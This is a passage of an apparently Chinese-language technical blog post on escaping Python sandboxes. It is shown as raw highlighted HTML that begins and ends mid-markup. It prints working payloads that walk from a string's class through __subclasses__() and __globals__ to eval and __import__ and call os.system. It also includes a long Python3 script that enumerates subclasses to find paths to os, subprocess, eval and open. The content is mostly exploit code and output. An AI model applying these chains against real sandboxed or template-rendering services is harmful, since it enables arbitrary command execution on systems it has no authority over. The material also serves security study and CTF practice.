class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;execfile&apos;)</span><br></pre></td></tr></table></figure><p>注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("calc")'</span>)</span><br></pre></td></tr></table></figure><p>其他类似修改即可。</p><p><strong>第四种方式</strong></p><p>这里只有一种序号，为60：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(60, &apos;__import__&apos;)</span><br><span class="line">(60, &apos;file&apos;)</span><br><span class="line">(60, &apos;repr&apos;)</span><br><span class="line">(60, &apos;compile&apos;)</span><br><span class="line">(60, &apos;eval&apos;)</span><br><span class="line">(60, &apos;open&apos;)</span><br><span class="line">(60, &apos;execfile&apos;)</span><br></pre></td></tr></table></figure><p>调用示例如下，其他类似修改即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">60</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"calc"</span>)</span><br></pre></td></tr></table></figure><p>前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">find_modules = &#123;<span class="string">'asyncio'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'concurrent'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dbm'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'email'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'html'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'http'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'json'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tkinter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtledemo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'venv'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_bootlocale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_collections_abc'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_compat_pickle'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_compression'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_dummy_thread'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_markupbase'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pydecimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'_sitebuiltins'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bz2'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'configparser'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copyreg'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'crypt'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'datetime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'enum'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fractions'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ftplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imp'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'ipaddress'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lzma'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'operator'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'pathlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pickle'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickletools'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plistlib'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'queue'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'re'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'reprlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'secrets'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'selectors'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'signal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'socketserver'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre_compile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statistics'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tracemalloc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tty'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'typing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'weakref'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'zipapp'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(list(find_modules.keys()) + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span 